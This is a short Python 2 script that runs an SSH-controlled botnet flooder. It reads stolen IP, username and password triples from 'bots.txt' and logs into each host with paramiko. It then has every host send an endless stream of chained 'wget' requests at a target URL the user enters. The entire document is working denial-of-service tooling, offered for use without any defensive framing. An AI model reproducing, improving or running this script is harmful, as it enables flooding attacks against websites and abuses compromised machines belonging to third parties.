import time,threading
try:
 import paramiko
 from paramiko import SSHClient, AutoAddPolicy
except:
 print"you need to install: paramiko"
 sys.exit()
n=0
while n<1:
  url=raw_input("\nURL: (http://www.example.com)\n>")
  if ("http://" in url) or ("https://" in url) or ("ftp://" in url):
   n+=1
  else:
   print"enter a valid URL"
print"[i]connecting to bots..."
f=open("bots.txt", "r")
li =f.readlines()
global v
v=0
class flood(threading.Thread):
 def run(self):
  c=v
  l=li[c].strip()
  while True:
     try:
      s = SSHClient()
      s.set_missing_host_key_policy(AutoAddPolicy())
      ip=l.split(":")[0]
      user=l.split(":")[1]
      pwd=l.split(":")[2]
      s.connect(ip, port=22,username=user, password=pwd)
      print"[+]",ip,"| connected"
      while True:
       msg="wget "+url
       for x in range(100):
        msg+=";"+"wget "+url
       s.exec_command(msg+"\n")
       print"[!] thread {} | {}@sshbotnet".format(c+1,ip)
     except Exception as e:
      try:
       s.close()
      except:
       pass
for x in range(len(li)):
 v=x
 t=flood()
 t.start()
 time.sleep(.001)